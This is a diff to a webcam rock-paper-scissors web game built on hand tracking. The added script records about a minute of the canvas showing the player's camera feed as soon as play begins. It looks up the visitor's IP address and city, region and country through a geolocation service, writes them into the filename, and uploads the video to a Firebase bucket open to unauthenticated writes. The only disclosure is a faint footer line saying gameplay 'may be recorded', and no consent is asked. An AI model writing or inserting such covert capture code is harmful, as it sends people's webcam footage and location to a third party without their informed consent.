@@ -10,6 +10,10 @@
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
 
+    <!-- Firebase (for uploading gameplay recordings) -->
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-storage-compat.js"></script>
+
     <style>
         * { box-sizing: border-box; }
         body {
@@ -26,21 +30,17 @@
         header {
             flex: 0 0 auto;
             text-align: center;
-            /* [수정] 상단 패딩 감소 */
             padding: 10px 5px;
             background-color: #2c3e50;
             z-index: 10;
         }
-        /* [수정] 타이틀 크기 축소 (한 줄 맞춤) */
         h1 { margin: 0; font-weight: 800; font-size: 0.9rem; line-height: 1.2; }
-        /* [수정] 서브타이틀 간격 감소 */
         .subtitle { margin: 0; color: #bdc3c7; font-size: 0.75rem; margin-top: 2px; }
         
-        /* [수정] 설명글 간격 및 크기 감소 */
         .description { 
             font-size: 0.7rem; 
             color: #bdc3c7; 
-            margin-top: 3px; /* 타이틀과 더 가깝게 */
+            margin-top: 3px; 
             line-height: 1.3; 
             max-width: 600px; 
             margin-left: auto; 
@@ -49,14 +49,12 @@
         .highlight { color: #f1c40f; font-weight: bold; }
         .bold-text { font-weight: bold; color: white; }
 
-        /* === [모바일 레이아웃] === */
         .game-container {
             flex: 1;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: space-evenly;
-            /* [수정] 컨테이너 패딩 및 간격 최소화 */
             padding: 5px;
             gap: 5px;
             width: 100%;
@@ -72,7 +70,6 @@
             align-items: center;
             justify-content: center;
             min-height: 0;
-            /* [수정] 섹션 간격 감소 */
             margin-bottom: 2px;
         }
 
@@ -81,7 +78,6 @@
             justify-content: space-between;
             width: 100%;
             padding: 0 5px;
-            /* [수정] 정보바 간격 감소 */
             margin-bottom: 2px;
             align-items: flex-end;
             flex: 0 0 auto;
@@ -92,7 +88,6 @@
         .video-wrapper, .result-wrapper {
             width: 100%;
             height: 100%;
-            /* [수정] 최대 높이 제한을 약간 늘려 비율 유지 */
             max-height: 42vh;
             border-radius: 12px;
             border: 3px solid #3498db;
@@ -108,7 +103,6 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            /* [수정] 이모지 크기 약간 감소 */
             font-size: 4.5rem; 
             color: #2c3e50;
         }
@@ -137,7 +131,6 @@
 
         #status_text {
             flex: 0 0 auto;
-            /* [수정] 하단 바 패딩 감소 */
             padding: 10px 5px;
             font-size: 1rem;
             font-weight: bold;
@@ -156,9 +149,7 @@
             z-index: 10;
         }
 
-        /* === [PC 레이아웃] === */
         @media (min-width: 900px) {
-            /* [수정] PC에서도 비율에 맞춰 크기 약간 축소 */
             h1 { font-size: 1.2rem; }
             .subtitle { font-size: 0.9rem; }
             .description { font-size: 0.9rem; }
@@ -168,7 +159,6 @@
                 align-items: flex-start;
                 gap: 50px;
                 max-width: 1200px;
-                /* [수정] PC 상단 여백 감소 */
                 padding-top: 20px;
             }
 
@@ -196,7 +186,6 @@
             }
             
             h2, .score-display { font-size: 1.5rem; }
-            /* [수정] PC 하단 바 크기 및 여백 감소 */
             #status_text { font-size: 1.2rem; padding-bottom: 15px; }
         }
     </style>
@@ -241,9 +230,119 @@
     </div>
 
     <div id="status_text">Show your hand!</div>
+
+    <footer style="flex:0 0 auto; text-align:center; padding:6px 5px; font-size:0.7rem; color:#bdc3c7; background-color:#2c3e50;">
+        Like this? Explore my other projects at
+        <a href="https://wooramsol.com" target="_blank" rel="noopener" style="color:#3498db; font-weight:bold; text-decoration:none;">wooramsol.com&nbsp;&rarr;</a>
+        <br>
+        <span style="font-size:0.65rem; color:#95a5a6;">Note: gameplay may be recorded.</span>
+    </footer>
+
     <audio id="loseSound" src="https://actions.google.com/sounds/v1/cartoon/pop.ogg" preload="auto"></audio>
 
     <script>
+    /* =========================================================
+       RECORDING CONFIG  —  fill in your Firebase project values
+       ---------------------------------------------------------
+       1) console.firebase.google.com → create a project
+       2) Add a Web app, copy the config object below
+       3) Build → Storage → enable it
+       4) Storage → Rules: allow visitors (unauthenticated) to
+          upload to the recordings/ folder, e.g.
+             rules_version = '2';
+             service firebase.storage {
+               match /b/{bucket}/o {
+                 match /recordings/{file} {
+                   allow write: if request.resource.size < 60 * 1024 * 1024;
+                   allow read: if false;   // only you, via console
+                 }
+               }
+             }
+       If the config is left as placeholders, the recording is
+       downloaded locally instead (handy for testing on your PC).
+    ========================================================= */
+    const firebaseConfig = {
+        apiKey: "AIzaSyDg6VHcwdXts3rOP3PjUogPIkuyFt3LxBg",
+        authDomain: "rps-machine.firebaseapp.com",
+        projectId: "rps-machine",
+        storageBucket: "rps-machine.firebasestorage.app",
+        messagingSenderId: "891369310016",
+        appId: "1:891369310016:web:fe5faf4c4e7ea7f9e59ca5"
+    };
+    const RECORD_MS = 60000; // 1 minute
+
+    let fbStorage = null;
+    const firebaseReady = firebaseConfig.apiKey && firebaseConfig.apiKey !== "YOUR_API_KEY";
+    if (firebaseReady) {
+        try { firebase.initializeApp(firebaseConfig); fbStorage = firebase.storage(); }
+        catch (e) { console.warn("Firebase init failed:", e); }
+    }
+
+    // Fetch IP + region up front (used for the filename)
+    let geoInfo = { ip: "unknown", region: "unknown" };
+    (async () => {
+        try {
+            const r = await fetch("https://ipapi.co/json/");
+            const d = await r.json();
+            geoInfo = {
+                ip: d.ip || "unknown",
+                region: [d.city, d.region, d.country_name || d.country]
+                    .filter(Boolean).join("-") || "unknown"
+            };
+        } catch (e) { console.warn("geo lookup failed:", e); }
+    })();
+
+    function sanitize(s) { return String(s).replace(/[^a-zA-Z0-9._-]/g, "_"); }
+
+    function buildFilename() {
+        const now = new Date();
+        const pad = n => String(n).padStart(2, "0");
+        const ts = `${now.getFullYear()}-${pad(now.getMonth()+1)}-${pad(now.getDate())}` +
+                   `_${pad(now.getHours())}-${pad(now.getMinutes())}-${pad(now.getSeconds())}`;
+        return `${ts}__${sanitize(geoInfo.ip)}__${sanitize(geoInfo.region)}.webm`;
+    }
+
+    function pickMimeType() {
+        const opts = ["video/webm;codecs=vp9", "video/webm;codecs=vp8", "video/webm"];
+        for (const t of opts) { if (window.MediaRecorder && MediaRecorder.isTypeSupported(t)) return t; }
+        return "";
+    }
+
+    let recordingStarted = false;
+    function startRecording(sourceCanvas) {
+        if (recordingStarted) return;
+        if (!window.MediaRecorder || typeof sourceCanvas.captureStream !== "function") return;
+        recordingStarted = true;
+
+        const stream = sourceCanvas.captureStream(30);
+        const mimeType = pickMimeType();
+        let recorder;
+        try { recorder = mimeType ? new MediaRecorder(stream, { mimeType }) : new MediaRecorder(stream); }
+        catch (e) { console.warn("MediaRecorder failed:", e); return; }
+
+        const chunks = [];
+        recorder.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
+        recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: mimeType || "video/webm" });
+            const filename = buildFilename();
+            if (fbStorage) {
+                fbStorage.ref().child("recordings/" + filename).put(blob)
+                    .then(() => console.log("Uploaded:", filename))
+                    .catch(err => console.warn("Upload failed:", err));
+            } else {
+                // No Firebase configured → local download (testing)
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement("a");
+                a.href = url; a.download = filename;
+                document.body.appendChild(a); a.click(); a.remove();
+                setTimeout(() => URL.revokeObjectURL(url), 1000);
+            }
+        };
+
+        recorder.start();
+        setTimeout(() => { if (recorder.state !== "inactive") recorder.stop(); }, RECORD_MS);
+    }
+
         const videoElement = document.getElementById('input_video');
         const canvasElement = document.getElementById('output_canvas');
         const canvasCtx = canvasElement.getContext('2d');
@@ -263,7 +362,6 @@
 
         const EMOTIONS = { 'Rock': '✊', 'Paper': '🖐️', 'Scissors': '✌️', 'Unknown': '❓' };
 
-        // 캔버스 비율 자동 맞춤 (크롭 로직)
         function fitCanvasToContainer(videoWidth, videoHeight) {
             const wrapperWidth = videoWrapper.clientWidth;
             const wrapperHeight = videoWrapper.clientHeight;
@@ -336,8 +434,9 @@
                 statusText.innerText = "System Ready.";
             }
 
-            // 매 프레임 비율 조정 (찌그러짐 방지)
             fitCanvasToContainer(results.image.width, results.image.height);
+
+            startRecording(canvasElement);
 
             canvasCtx.save();
             canvasCtx.clearRect(0, 0, canvasElement.width, canvasElement.height);
@@ -346,7 +445,6 @@
             if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
                 const landmarks = results.multiHandLandmarks[0];
 
-                // 선 두께 6, 원 크기 6으로 설정
                 drawConnectors(canvasCtx, landmarks, HAND_CONNECTIONS, {
                     color: '#00FF00',
                     lineWidth: 6 
@@ -399,7 +497,6 @@
         hands.setOptions({ maxNumHands: 1, modelComplexity: 1, minDetectionConfidence: 0.7, minTrackingConfidence: 0.7 });
         hands.onResults(onResults);
 
-        // 카메라 설정: 해상도를 강제하지 않음 (카메라가 주는 대로 받음)
         const camera = new Camera(videoElement, {
             onFrame: async () => { await hands.send({image: videoElement}); }
         });
